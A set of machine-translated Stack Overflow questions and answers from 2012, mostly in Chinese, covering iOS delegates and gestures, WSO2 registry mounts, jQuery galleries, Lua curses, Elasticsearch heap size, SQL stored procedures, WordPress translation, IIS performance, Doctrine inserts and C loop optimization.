*   一旦 B 完成获取数据，它将调用 A 的某个指定方法。

在最后一步中，假设在调用 A 的方法时，B 发现 A 对象不再存在。然后会发生什么？？？

我不确定，但它会导致崩溃吗？

如果是，那么请建议我如何避免这种情况。

在我的情况下，我将视图控制器分配为某个对象的委托，例如`viewDidLoad`方法中的 X。在某些情况下，视图控制器在 X 调用视图控制器中定义的委托方法之前被销毁。

*   如果将 X 的委托分配给 nil 可以解决问题。那我应该在哪里做。

简而言之，在视图控制器的卸载阶段，同样 `viewDidLoad`在其加载阶段，哪个方法只被调用一次。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:15:47.720

您不应该遇到这样一种情况，即一个对象持有对另一个对象的引用，该对象可能在其他地方被释放而没有通知所有者对象。

在解除分配对象时`A`通知对象`B`（`a` `nill`例如，通过在对象 B 中创建成员）或修改您的设计/流程以在完成之前永远不允许`A`被解除分配（例如，如果可能，在分配为委托时`B`保留）`A``B`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T13:03:27.510

实现类之间这种通信的最好方法（类 A 可以随时被释放）是监听**`NSNotifications`**.
正如您所说，使用**弱（分配）**代表是危险的，需要额外考虑。
使用**强**委托也可能造成内存膨胀（为什么我们要在从视图中弹出视图控制器后保留这么长时间？）。

有关 NSNotificationCenter 和通知的更多信息，您可以在 SDK 文档中找到很多信息。对于特定问题，您知道在哪里提问。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:03:35.257

检查有效的委托对象就足够了。

```
if (delegate)
   [delegate method]; 
```

# wso2esb - 远程注册表无法在 WSO2 ESB 4.5.0 上挂载

> ID：12954124
> 
> 赞同：3
> 
> 时间：2012-10-18T12:01:15.560
> 
> 标签：wso2esb, wso2carbon

我正在尝试按照此处的建议将远程注册表安装到 ESB 4.5.0：http: [//ajithvblogs.blogspot.com/2012/09/create-jdbc-mount-to-wso2-governance.html](http://ajithvblogs.blogspot.com/2012/09/create-jdbc-mount-to-wso2-governance.html)

一切都是根据给定的说明完成的 - 但是我在 ESB 启动期间遇到了以下错误：

```
TID: [] [WSO2 Enterprise Service Bus] [2012-10-18 07:48:42,555]  WARN {org.wso2.carbon.registry.core.config.RegistryConfigurationProcessor} -  The instance     identifier was not specified for the mount: /_system/config {org.wso2.carbon.registry.core.config.RegistryConfigurationProcessor}

TID: [] [WSO2 Enterprise Service Bus] [2012-10-18 07:48:42,557]  WARN {org.wso2.carbon.registry.core.config.RegistryConfigurationProcessor} -  The instance identifier was not specified for the mount: /_system/governance {org.wso2.carbon.registry.core.config.RegistryConfigurationProcessor} 
```

没有更多的额外错误。

ESB registry.xml 代码片段：

```
<dbconfig name="wso2registry_mounted">
    <datasource>jdbc/WSO2CarbonDB_GREG</datasource>
</dbconfig>

<remoteinstance url="https://localhost:9445/registry">
    <id>wso2_registry_mounted</id>
    <dbconfig>wso2registry_mounted</dbconfig>
    <readonly>false</readonly>
    <enablecache>true</enablecache>
    <registryroot>/</registryroot>
</remoteinstance>

<mount overwrite="true" path="/_system/config">
    <instanceid>wso2_registry_mounted</instanceid>
    <targetpath>/_system/nodes</targetpath>
</mount>

<mount overwrite="true" path="/_system/governance">
    <instanceid>wso2_registry_mounted</instanceid>
    <targetpath>/_system/governance</targetpath>
</mount> 
```

有人可以建议这里有什么问题吗？

最好的问候，弗拉基米尔。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-19T02:17:23.533

它应该`<instanceId>`不在`<instanceid>`配置中。有类似的骆驼案例问题。请看一下这个配置元素。

```
<remoteInstance url="https://localhost:9447/registry">
        <id>instanceid</id>
        <dbConfig>govRegistry</dbConfig>
        <readOnly>true</readOnly>
        <enableCache>true</enableCache>
        <registryRoot>/</registryRoot>
    </remoteInstance>

    <mount path="/_system/config" overwrite="true">
        <instanceId>instanceid</instanceId>
        <targetPath>/_system/esb</targetPath>
    </mount>

    <mount path="/_system/governance" overwrite="true">
        <instanceId>instanceid</instanceId>
        <targetPath>/_system/governance</targetPath>
    </mount> 
```

# iphone - IOS：导航栏 - 重新加载视图控制器

> ID：12954126
> 
> 赞同：0
> 
> 时间：2012-10-18T12:01:20.823
> 
> 标签：iphone, ios, reload, navigationbar

当我们从导航栏返回视图控制器时，有什么方法可以释放吗？

当我从导航栏返回屏幕时，我想重新加载 NIB。

可能吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:33:47.263

您可能`viewWillAppear:animated`想看看`viewDidAppear:animated`. `UIViewController`每次将视图控制器推送到显示时都会调用它们。

```
- (void)viewWillAppear:(BOOL)animated {

    [super viewWillAppear:animated];
    // Reload your data here, and this gets called
    // before the view transition is complete.
}

- (void)viewDidAppear:(BOOL)animated {

    [super viewDidAppear:animated];
    // Reload your data here, and this gets called
    // after the view transition is complete.
} 
```

# jquery - 动态 Json jquery 多级图片库

> ID：12954129
> 
> 赞同：0
> 
> 时间：2012-10-18T12:01:29.987
> 
> 标签：jquery, json, image-gallery

我正在使用多级图片库构建网站。我使用 json 来存储数据：它看起来像这样：

```
{
   "fashion":[
      {
         "alt":"Album1",
         "src":"img/gsp_sait-03_02.png",
         "class":"albumItem",
         "id":"FashionAlbum1",
         "album":[
            {
               "alt":"albumImg1",
               "src":"img/gsp_sait-03_02.png",
               "id":"FashionSubFolder1Img1"
            },
            {
               "alt":"albumImg2",
               "src":"img/gsp_sait-03_03.png",
               "id":"FashionSubFolder1Img2"
            }
         ]
      }
   ],
   "beauty":[
      {
         "alt":"Album1",
         "src":"img/gsp_sait-03_02.png",
         "class":"albumItem",
         "id":"BeautyAlbum1",
         "album":[
            {
               "alt":"albumImg1",
               "src":"img/gsp_sait-03_02.png",
               "id":"BeautySubFolder1Img1"
            },
            {
               "alt":"albumImg2",
               "src":"img/gsp_sait-03_03.png",
               "id":"BeautySubFolder1Img2"
            }
         ]
      }
   ],
   "wedding":[
      {
         "alt":"Album1",
         "src":"img/gsp_sait-03_02.png",
         "class":"albumItem",
         "id":"WeddingAlbum1",
         "album":[
            {
               "alt":"albumImg1",
               "src":"img/gsp_sait-03_02.png",
               "id":"WeddingSubFolder1Img1"
            },
            {
               "alt":"albumImg2",
               "src":"img/gsp_sait-03_03.png",
               "id":"WeddingSubFolder1Img2"
            }
         ]
      }
   ]
} 
```

我找不到如何选择正确类别的方法。假设用户点击美女，所以我需要选择“美女”部分，我使用这个功能：

```
$.getJSON("data/data.json", function(data) {
    $.each(data.beauty, function(i, data) {
        var img = "<li><img class='" + data.class + "' id='" + data.id + "' src='" + data.src + "' alt='" + data.alt + "' /></li>";
        $(".albumsList").append(img);
    });
});​ 
```

我需要让它充满活力。我试图在行中插入一个包含类别的变量，而不是“美”：

```
 $.each(data.beauty, function (i, data) 
```

但它不起作用，或者我做错了。有什么办法可以使它动态化，也许我的 json 文件不适合这种需求？

第二件事，当用户选择相册时，（“美女”部分）我想显示这个相册内的所有图片。

```
$.getJSON("data/data.json", function(data) {
    $.each(data.beauty[0].album, function(i, data) {
        var img = "<li><img ' id='" + data.id + "' src='" + data.src + "' alt='" + data.alt + "' /></li>";
        $(".albumPhotosList").append(img).hide().fadeIn(500);
    });
});​ 
```

但问题是一样的，我需要它是动态的。

非常感谢您的帮助。我真的很累。谢谢你变化很大！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:31:20.370

对于第一个问题，当用户单击链接时，您可以将链接文本（或通过自定义属性）传递给 json 属性以查找。例如，假设您的链接如下所示：

```
<a href="#" data-jsonproperty="fashion">Fashion</a>
<a href="#" data-jsonproperty="beauty">Beauty</a>
<a href="#" data-jsonproperty="wedding">Wedding</a> 
```

对于第一个问题，您可以这样编写脚本：

```
$(".link").click(function() {
    var jsonProperty = $(this).data("jsonproperty");
    $.getJSON("data/data.json", function(data) {
        $.each(data[jsonProperty], function(i, data) {
            var img = "<li><img class='" + data.class + "' id='" + data.id + "' src='" + data.src + "' alt='" + data.alt + "' /></li>";
            $(".albumsList").append(img);
        });
    });
}); 
```

您可以类似地解决第二个问题：

```
$.getJSON("data/data.json", function(data) {
    $.each(data[jsonProperty][0].album, function(i, data) {
        var img = "<li><img ' id='" + data.id + "' src='" + data.src + "' alt='" + data.alt + "' /></li>";
        $(".albumPhotosList").append(img).hide().fadeIn(500);
    });
}); 
```

# lua - lcurses中的宽字符

> ID：12954134
> 
> 赞同：2
> 
> 时间：2012-10-18T12:02:16.287
> 
> 标签：lua, ncurses, luajit

*在 Lua 中使用lcurses*进行编程时，我注意到相同的代码在*lua*和*luajit*上的运行方式不同（假设源存储在 UTF-8 中）：

```
local locale = os.setlocale('')
require 'curses'

curses.initscr()
curses.cbreak()
curses.echo(0)
curses.nl(0)

local stdscr = curses.stdscr()
stdscr:clear()
stdscr:mvaddstr(0,0,'--->English,')
stdscr:mvaddstr(1,0,'--->Español')
stdscr:mvaddstr(2,0,'--->Русский (Russian)')
stdscr:mvaddstr(3,0,'--->日本語 (Japanese)')
stdscr:refresh()

stdscr:getch()
curses.endwin()

print(locale) 
```

在*luajit*上运行时，所有内容都按预期打印，但在普通*lua*上，每个 UTF-8 字符都会变成看起来很奇怪的序列：

```
--->English,
--->EspaM-CM-1ol
--->M-PM- M-Q~CM-Q~AM-Q~AM-PM-:M-PM-8M-PM-9 (Russian)
--->M-f~WM-%M-f~\M-,M-hM-*~^ (Japanese) 
```

这是在 Linux 下使用 en_US.UTF-8 语言环境在 UTF-8 感知控制台中运行的。我还研究了*lcurses* rock附带的*curses.so*，发现它使用的是正确的*ncurses*库（支持宽字符）：

```
$ readelf -a curses.so | grep NEEDED
0x00000001 (NEEDED)                     Shared library: [libncursesw.so.5]
0x00000001 (NEEDED)                     Shared library: [libc.so.6] 
```

软件版本：

*   lua 5.1.4
*   luajit 2.0.0 beta7
*   诅咒 5.9
*   lcurses 6-2（从 luarocks 安装）

**编辑：**

问题本身，我从一开始就忘记写了：

*   有人知道为什么会这样吗？
*   如何让它在普通的lua中工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T17:34:41.373

标准 Lua 只处理 ASCII 字符。字符串可以包含非 ASCII，但 Lua 不知道如何打印它们。LuaJIT 有[特殊的扩展](http://luajit.org/extensions.html)能够处理 UTF-8 字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-16T13:01:55.080

要使用原始 utf-8 文本，只需在程序开头添加一行：

```
os.setlocale('') 
```

# java - 在 Java 中取消引用字段名称以对其进行验证

> ID：12954135
> 
> 赞同：0
> 
> 时间：2012-10-18T12:02:16.873
> 
> 标签：java, spring

在`PHP`，当然，这是一种解释性语言，我可以在运行时取消引用字段名称，例如`'source'`和`'value'`以下，并使用源和值指向的这两个字段的值。

```
{$key['source']}[LANGUAGE_NONE][0]['value']; 
```

是否有类似的设施`Java`可以这样做？我有一个 bean 的一些属性，我需要对其进行验证和执行各种检查。我不想对逻辑进行硬编码，而是想遍历一个`SQL`字段名表并在该字段上执行指示的验证。例如，如果我`"email"`在数据库中有值，我会选择下面的属性并根据数据库列中的规则对其进行验证：

```
String email; 
```

我将拥有许多豆子和许多领域，这就是我考虑这种方法的原因。我对设计没有发言权:(

我在想的另一个选项是 using `Spring validation`，但在提交 a 之前似乎没有办法触发它`Spring Form Bean`。也许有另一种触发方式？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:11:04.983

我认为您是说您希望将属性名称存储在数据存储中，并在运行时访问该数据存储以查询属性。您描述的构造最接近 Java 中的 Map - 键/值对，没有什么可以阻止您访问以这种方式存储的数据，例如`myMap.get("myproperty");`. 问题是将所有对象建模为地图不是很面向对象。

另一种选择是使用反射和约定。因此，数据库中名为“source”的属性将由名为“getSource()”的方法访问。这类似于 JavaBeans

这是你的意思吗？

# elasticsearch - 如何在 Debian 中为 elasticsearch 设置内存限制？

> ID：12954136
> 
> 赞同：0
> 
> 时间：2012-10-18T12:02:16.370
> 
> 标签：elasticsearch

我需要在debian中增加elasticsearch的内存限制..请让我知道我应该在哪个文件中进行更改以增加它的内存..以及如何检查是否设置了内存限制...当我得到一个错误类似于：打开的文件太多请帮助...

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-09-23T21:58:01.197

设置内存的最佳方法是设置 ES_HEAP_SIZE 参数，并让它决定最小值和最大值。

对于 Ubuntu，只需打开 /etc/default 中的 elasticsearch 文件：

```
sudo vim /etc/default/elasticsearch 
```

并确保以下行已设置或未注释，并将其设置为总内存的一半：

```
ES_HEAP_SIZE=4g 
```

然后保存文件，然后重新启动 elasticsearch：

```
sudo service elasticsearch restart 
```

有关设置堆大小的更多信息，您可以[在此处查看这篇文章](http://www.elasticsearch.org/guide/en/elasticsearch/guide/current/heap-sizing.html)。授予指南告诉您只需使用 export 命令创建一个环境变量；但是，这对我不起作用，尽管 /etc/default/elasticsearch 文件可以工作，即使在重新启动后也是如此。

注意：不要将堆大小设置为超过 32Gb。对 heap_size 使用小数会破坏 Elasticsearch。如果您需要使用部分 Gb，请像这样使用 Mb `ES_HEAP_SIZE=3750m`：. 奇迹般有效。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T15:27:02.317

Rajni 是绝对正确的。我和 OP 有同样的问题，并在服务脚本的开头附近找到了所有设置的值：

```
ES_HOME=/opt/elasticsearch
ES_MIN_MEM=256m
ES_MAX_MEM=2g
DAEMON=$ES_HOME/bin/elasticsearch
NAME=elasticsearch
DESC=elasticsearch
PID_FILE=/var/run/$NAME.pid
LOG_DIR=/var/log/$NAME
DATA_DIR=/var/lib/$NAME
WORK_DIR=/tmp/$NAME
CONFIG_FILE=$ES_HOME/config/elasticsearch.yml 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-08-05T00:58:15.310

大声笑，我的代表太低了，简单地回答：但我只想确认文件 /etc/init.d/elasticsearch 包含启动信息。MIN 和 MAX_MEM 是最小和最大堆大小

我很确定如果您在 systemd 上，等效文件将在 /etc/default/ 下

重新启动 elasticsearch 以使您的设置生效。如果您使用的是 systemd：sudo systemctl restart elasticsearch。如果由于设置错误而无法重启，sudo systemctl status elasticsearch

这个答案讨论了其他一些选项 [如何更改 Elasticsearch 最大内存大小](https://stackoverflow.com/questions/18132719/how-to-change-elasticsearch-max-size)

# iphone - 我在我的 ImageView 中使用了 PinchGesture。这段代码运行完美，现在我想在某个大小处停止 ZoomOut，我该怎么办？

> ID：12954137
> 
> 赞同：0
> 
> 时间：2012-10-18T12:02:22.307
> 
> 标签：iphone, ios, uiimageview, uigesturerecognizer

我用`PinchGesture`在我的。这段`ImageView`代码运行完美，现在我想停`ZoomOut`在某个大小，我该怎么办？

```
UIPanGestureRecognizer *panGesture=[[UIPanGestureRecognizer alloc]initWithTarget:self action:@selector(handlePan:)];
    panGesture.delegate=self;
    [overlayimageView addGestureRecognizer:panGesture];

- (void)handlePinch:(UIPinchGestureRecognizer *)recognizer
{

    recognizer.view.transform = CGAffineTransformScale(recognizer.view.transform, recognizer.scale, recognizer.scale);
    recognizer.scale = 1;
} 
```

![这里开始图片](../Images/08e6ae0f2c18942bd6f58a45978e7268.png)

![但我不想缩小超过 200*200](../Images/c3665553befef420bfdd20bec102b80f.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:11:53.977

```
CGFloat scale = 1.0 - (ImageLastScale - pinchscale);
CGRect bounds = [(UIPinchGestureRecognizer*)sender view].bounds;
scale = MIN(scale, maximumHeight / CGRectGetHeight(bounds));//define maximumHeight and minimumHeight for zoom level
scale = MAX(scale, minimumHeight / CGRectGetHeight(bounds)); 
```

使用方法我像下面这样使用它。在.h文件中将`lastScale`变量定义为对象`Float`

```
-(void)scale:(id)sender {

    if([(UIPinchGestureRecognizer*)sender state] == UIGestureRecognizerStateEnded) {
        lastScale = 1.0;
        return;
    }

    CGFloat pinchscale = [(UIPinchGestureRecognizer*)sender scale];
    CGFloat scale = 1.0 - (lastScale - pinchscale);
    CGAffineTransform currentTransform = [(UIPinchGestureRecognizer*)sender view].transform;
    CGAffineTransform holderTransform = holderView.transform;
    CGAffineTransform newTransform = CGAffineTransformScale(currentTransform, scale, scale);
    [[(UIPinchGestureRecognizer*)sender view] setTransform:newTransform];

    CGFloat scale = 1.0 - (lastScale - pinchscale);
    CGRect bounds = [(UIPinchGestureRecognizer*)sender view].bounds;
    scale = MIN(scale, maximumHeight / CGRectGetHeight(bounds));
    scale = MAX(scale, minimumHeight / CGRectGetHeight(bounds));

    lastScale = [(UIPinchGestureRecognizer*)sender scale];
} 
```

**更新**

```
 UIPinchGestureRecognizer *pinchGesture=[[UIPinchGestureRecognizer alloc]initWithTarget:self action:@selector(scale:)];
    pinchGesture.delegate=self;
    [overlayimageView addGestureRecognizer:pinchGesture]; 
```

我希望这个答案对你有帮助..

# javascript - 用于更改非必填字段值的 Javascript

> ID：12954141
> 
> 赞同：5
> 
> 时间：2012-10-18T12:02:33.463
> 
> 标签：javascript

基本上，我在输入框中有字段的标签，并使用*onblur*和*onclick*清除值等。我还有一些 javascript 来确保所需的文件不会作为标签提交，例如名字包含标签`First Name*`，我不希望它提交为`First Name*`.

我苦苦挣扎的地方是评论框。这不是必填字段，所以我不想弹出警报，我只希望 javascript 将值更改为空白或 n/a（如果它保留为“评论”）。这是我用来尝试实现此目的的 javascript 代码：

```
var comments=document.getElementById('comments').value;
if (comments=="comments")
{
    document.getElementById('comments').value="n/a";
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T13:06:40.227

我认为您的评论字段是 textarea .... 使用

```
document.getElementById('comments').innerText 
```

反而

```
document.getElementById('comments').value 
```

# sql - 存储过程可以返回超过 1 个值吗？

> ID：12954143
> 
> 赞同：0
> 
> 时间：2012-10-18T12:02:38.267
> 
> 标签：sql, sql-server-2008, stored-procedures

无论如何，存储过程是否可以返回值列表，例如名为 as 的列`ClientName`并返回所有客户端名称。

我不想创建视图或另一个表，它必须在存储过程中完成，或者如果有任何其他方式。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:04:42.773

存储过程可以返回行集

```
create procedure sp_Test
as
begin
    select 'Name1' as ClientName union all
    select 'Name2' as ClientName
end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:04:57.343

是的，它可以如下：

```
CREATE PROCEDURE GetClientsNames
AS
BEGIN
   SELECT Name AS 'ClientName'
   FROM Clients
END 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:05:19.580

当然，您可以创建带有返回数据集的[SQL Server 存储过程。](http://msdn.microsoft.com/en-us/library/aa174792%28v=sql.80%29.aspx)例如：

```
CREATE PROCEDURE ProcedureName
AS
SELECT ClientName From yourTable; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-19T13:20:14.420

您可以通过以下查询来做到这一点

```
CREATE PROCEDURE Sp_AllClients

AS
BEGIN

    SELECT ClientName From YourTable
END 
```

要获取 ClientNames 列表，请执行过程

```
exec Sp_AllClients 
```

# web-services - Visual Studio 无法添加 MCF 服务引用

> ID：12954146
> 
> 赞同：0
> 
> 时间：2012-10-18T12:02:42.650
> 
> 标签：web-services, mfc

我开发了一个 MCF 服务，并在我的本地机器上对其进行了测试，它运行良好。

然后，我将此服务上传到我的网站。我导航到服务地址，我可以看到服务和 WSDL 的描述页面。

现在，我打开了我的 Visual Studio 2010 并创建了一个应该使用该服务的控制台应用程序。

每当我尝试使用 Visual Studio 添加服务引用时，我都会收到以下错误：

* * *

下载“http://www.mywebsite.com/CBIWebServices/UpdateCurrencies.svc”时出错。无法解析远程名称：“www.mywebsite.com”元数据包含无法解析的引用：“http://www.mywebsite.com/CBIWebServices/UpdateCurrencies.svc”。在[http://www.mywebsite.com/CBIWebServices/UpdateCurrencies.svc](http://www.mywebsite.com/CBIWebServices/UpdateCurrencies.svc)上没有可以接受消息的端点监听。这通常是由不正确的地址或 SOAP 操作引起的。有关更多详细信息，请参阅 InnerException（如果存在）。无法解析远程名称：'www.mywebsite.com' 如果在当前解决方案中定义了服务，请尝试构建解决方案并再次添加服务引用。

* * *

为什么会这样？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-24T08:02:23.783

我找到了解决方案。

出于某种未知原因（至少对我而言），我需要从服务地址中删除 WWW 并只使用域名。

错误的：

```
http://www.mywebsite.com/MyService 
```

正确的：

```
http://mywebsite.com/MyService 
```

我不知道我为什么要忽略万维网。但这就是它对我有用的方式

# localization - 无法使用 poedit 翻译 wordpress 插件

> ID：12954149
> 
> 赞同：3
> 
> 时间：2012-10-18T12:02:57.217
> 
> 标签：localization, wordpress

我正在尝试翻译我的 wordpress 插件，我按照以下步骤操作：

1.  首先，我使用 poedit 在 /plugin/languages 文件夹中创建了 .po 文件

2.  然后在 wp-config 文件中我把代码

    `define ('WPLANG', 'ajaxEdit-aa_AA'); define('WP_LANG_DIR', $_SERVER['DOCUMENT_ROOT'].'/wordpress/wp-content/plugins/wp-ajax-edit-comments');`

在文件中，我编写了要翻译的代码如下：

```
<?php _e('Behavior', 'ajaxEdit');?> 
```

当我从中删除时`ajaxEdit`，`_E()`它正在被翻译，但是当我使用时`ajaxEdit`，它没有被翻译。我应该怎么做才能使用这个翻译插件`ajaxEdit`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T23:12:05.623

如果您使用的是文本域，并且鼓励您这样做，您需要在插件的某处声明它。我认为，不知何故，当您不声明文本域时，它会使用您在 wp-config.php 中设置的默认值。

在我自己的插件上尝试了几个钩子之后，这对我有用，把它放在文件的开头：

```
add_action('init', 'yourplugin_init');

function yourplugin_init() {
    load_plugin_textdomain('ajaxEdit','',plugin_basename( dirname( __FILE__ ) .'/languages' ));
} 
```

*第一个属性是您正在使用的文本域（您在e() 或 _* () 函数中用作第二个参数以指向正确的翻译文件）。第二个是空的，它没有被使用，因为它已被弃用。然后，第三个：它是文件的位置。在此示例中，翻译文件位于插件内的子目录中，这是打包它的最佳方式。因此，我建议您将文件移动到该目录。请记住不要在域名中使用下划线（无论如何，这不是您的情况）。

WPLANG 用于设置您的站点主要语言，插件、主题、系统后端和所有有翻译的东西都会采用这种语言。它的典型属性是一个 ISO-639 语言代码，后跟 ISO-3166 国家代码，例如：pt_BR、pt_PT、es_ES 或 es_AR。在这种情况下，您似乎在做一些根本不推荐的事情，即使您让它发挥作用。

# asp.net - 为什么 IIS 比 ASP.NET 开发服务器慢？

> ID：12954150
> 
> 赞同：5
> 
> 时间：2012-10-18T12:02:58.437
> 
> 标签：asp.net, performance, iis, cassini

我有一个 ASPX 网页，它执行一些复杂的操作和数据库调用。当我通过运行 ASP.NET Development Server (Cassini) 查看网页时，大约需要*200ms*。

然后，*在没有任何代码更改和配置更改*的情况下，我将网站部署到我的本地计算机 IIS 7 并再次查看相同的网页。它需要*2.0 秒*，**慢了 10 倍**。

我认为 IIS 应该比 Cassini 更快（或至少与 Cassini 一样快）。

为了进一步调查，我创建了一个新页面 test1.aspx，它只包含一个在 Page_Load 中运行了 9000 万次的空 for 循环。在 Cassini 中，大约需要 200 毫秒。在 IIS 中，它需要 300 毫秒（慢 50%）。

导致 IIS 比 Cassini 慢的原因可能是什么？或者，也许是一个更好的问题，我怎样才能使 IIS 至少与 Cassini 一样快？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-18T12:02:58.437

### 快速而简短的回答：

配置 Web 应用程序使用的应用程序池以启用 32 位应用程序：

![将启用 32 位应用程序设置为 True](../Images/493167d2b62c4694f39b650228514be5.png)

### 详细攻略：

我使用了一些[性能分析工具](https://stackoverflow.com/questions/3927/what-are-some-good-net-profilers/379641 "有哪些好的 .NET 分析器？")（有些是[免费](https://stackoverflow.com/q/308816/379641 "有什么好的免费 .NET Profiler 吗？")的）来比较性能并找出瓶颈。免费的[EQATEC Profiler](http://www.eqatec.com/tools/profiler)足以让我比较运行 Cassini 和 IIS 生成的两个报告，并确定导致问题的方法。但是，该方法包含太多行，我无法确定导致问题的确切行。

然后[Redgate ANTS](http://www.red-gate.com/products/ants_performance_profiler/)就派上用场了。通过使用行级详细信息分析该方法，我发现它是 RegEx 运行非常缓慢。

进一步搜索使我在这里找到答案：[RegEx.Match 在 IIS 中比 Development Server (Cassini) 慢得多](https://stackoverflow.com/a/11375223/379641)。我正在使用带有 IIS 7 的 Windows 7 64 位。将“启用 32 位应用程序”设置为 True 可以解决问题。

* * *

此外，关于以 32 位或 64 位运行 IIS 的一些相关阅读：

> 64 位服务器在用于 SQL Server 等数据库或其他数据管理服务器（例如，Exchange 等企业电子邮件服务器）时比用于***处理服务器***（如**IIS** 或它管理的工作进程）更有效。
> 
> 每次查找都需要 64 位指针，这会使一切变慢。

资料来源：[在 64 位操作系统上以 32 位与 64 位运行 IIS 的优缺点是什么？](https://stackoverflow.com/a/2061731/379641)

# php - Doctrine2 静默插入数据失败

> ID：12954152
> 
> 赞同：5
> 
> 时间：2012-10-18T12:03:02.177
> 
> 标签：php, mysql, insert, doctrine-orm

我正在使用，第一次我做 a 时`Doctrine`它无法数据，但第二次工作，第三次失败：`INSERT``persist/flush`

```
// there is no code executed between any of the attempts

$entity = new My\Entity();
$entity->setTag('A');  // just a random field
$em->persist($entity);
$em->flush();
// INSERT not performed
// if I exit here and check the database, no entry is added

$entity = new My\Entity();
$entity->setTag('B');
$em->persist($entity);
$em->flush();
// INSERT performed
// if I exit here and check the database, 1 entry has been added
// and I can see it's "B"

$entity = new My\Entity();
$entity->setTag('C');
$em->persist($entity);
$em->flush();
// INSERT not performed
// if I exit here and check the database, there is still only 1 entry added
// and I can see it's "B" 
```

这是我在尝试失败时注意到的：
- `PHP logs`（`error_reporting`设置为全部，其他 Doctrine 和 PHP 问题，包括警告，确实显示在日志中）中没有任何内容。
-`Doctrine SQLLogger`不显示任何内容（在第二次尝试时它确实显示`INSERT`）。

一些故障排除步骤：
-我想通过用`DQL` `INSERT`查询替换失败尝试来进一步排除故障，但是“ DQL[中不允许插入语句”:](http://doctrine-orm.readthedocs.org/en/2.0.x/reference/dql-doctrine-query-language.html) (-在失败尝试中实例化之前
做一个额外的尝试没有帮助-我可以插入尽可能多的我想要手动输入数据库的条目并且它可以工作，即使在第一次尝试时也是如此。- 我有同样的问题。-我 有同样的问题。`flush``$entity`
`2.4.0-DEV`
`2.2.2`

我可能会补充一点，代码是在`PHPunit`测试中执行的，并且在之前的测试中，我没有遇到这个问题（即 Doctrine 确实`INSERT`在第一个测试中正确执行`persist/flush`）。

**知道问题可能来自哪里吗？**

版本信息：
- `PHP 5.4`
- `Doctrine 2.3.0`(`pdo_mysql`驱动)
- `MySQL 5.5.24`
- `Ubuntu 12.04`
-`PHPUnit 3.7.7`

## 更新1：

好吧，这是答案的一部分。这个问题似乎是由我`PHPUnit` `setUp()`在每次测试之间截断数据库表时使用的例程引起的：

*   如果我在每次测试之间截断我的表，我就会遇到问题（即有些`INSERT`失败）。
*   如果我不截断，一切正常。

s 失败的方式`INSERT`似乎比最初想象的模式随机，因为我创建了 2 个测试，每个测试 3 个插入（并且只运行了那些）。在每个测试之间截断表时，每个测试中的 3 个插入会发生以下情况：
-test 1：SUCCESS / SUCCESS / SUCCESS
-test 2：SUCCESS / SUCCESS / FAILURE（我没有像我一样的 FAILURE / SUCCESS / FAILURE习惯了）。

这是我用来截断表格的一段代码：

```
$cmd = $em->getClassMetadata($className);
$connection = $em->getConnection();
$dbPlatform = $connection->getDatabasePlatform();
$connection->beginTransaction();
try {
    $connection->query('SET FOREIGN_KEY_CHECKS=0');
    $q = $dbPlatform->getTruncateTableSql($cmd->getTableName());
    $connection->executeUpdate($q);
    $connection->query('SET FOREIGN_KEY_CHECKS=1');
    $connection->commit();
}
catch (\Exception $e) {
    $connection->rollback();
} 
```

我从[这个 SO 帖子](http://doctrine-orm.readthedocs.org/en/2.0.x/reference/dql-doctrine-query-language.html)中得到了代码，据我所见，它看起来不错。如果我使用[其他代码](https://stackoverflow.com/questions/8526534/how-to-truncate-a-table-using-doctrine-in-symfony)，我也会遇到同样的问题：

```
$connection = $entityManager->getConnection();
$platform   = $connection->getDatabasePlatform();
$connection->executeUpdate($platform->getTruncateTableSQL('my_table', true /* whether to cascade */)); 
```

我修改了我的模式以测试有无外键，在这两种情况下我都有同样的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:53:23.140

最后，问题出现在以下情况下： -
截断函数中每个测试之间的表`setUp`。
`AND`
- 仅将 Doctrine 实例实例化一次`setUpBeforeClass`（我当时正在使用 访问`self::$em`）。

`OR`如果我在实例化我的 Doctrine 实例时不截断每个测试之间的表，那么`setUp`一切正常。

以前喜欢`setUpBeforeClass`，现在不喜欢了……

# c - Is there an advantage to knowing at compile time the number of iterations of a for loop?

> ID：12954157
> 
> 赞同：1
> 
> 时间：2012-10-18T12:03:21.553
> 
> 标签：c, optimization, opencl

Is there some advantage to knowing at compile time how many iterations should be done of a for loop?

For example, in some situations, can the compiler produce an executable that will run faster given this:

```
#define ITERATIONS 10
int foo()
{
    for (int i=0; i < ITERATIONS; i++){
        do_something();
    }
} 
```

than given this:

```
int foo(int iterations)
{
    for (int i=0; i < iterations; i++){
        do_something();
    }
} 
```

If this is not universally the case, what are those situations?

My concern is in the specific case of OpenCL, so I'm also interested to know if this is different to C.

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-18T12:15:12.040

I tested in a fairly realistic situation using GCC. When the number of loops is known at compile time, I get this:

```
.L2:
    call    do_something
    subl    $1, %ebx
    jne .L2 
```

When it's not, I get this:

```
.L6:
    call    do_something
    addl    $1, %ebx
    cmpl    %ebp, %ebx
    jne .L6 
```

So it was able to optimize the fixed number of iterations slightly better by changing to a count down to zero loop rather than a count up loop. If nothing else, this uses a bit less code cache.

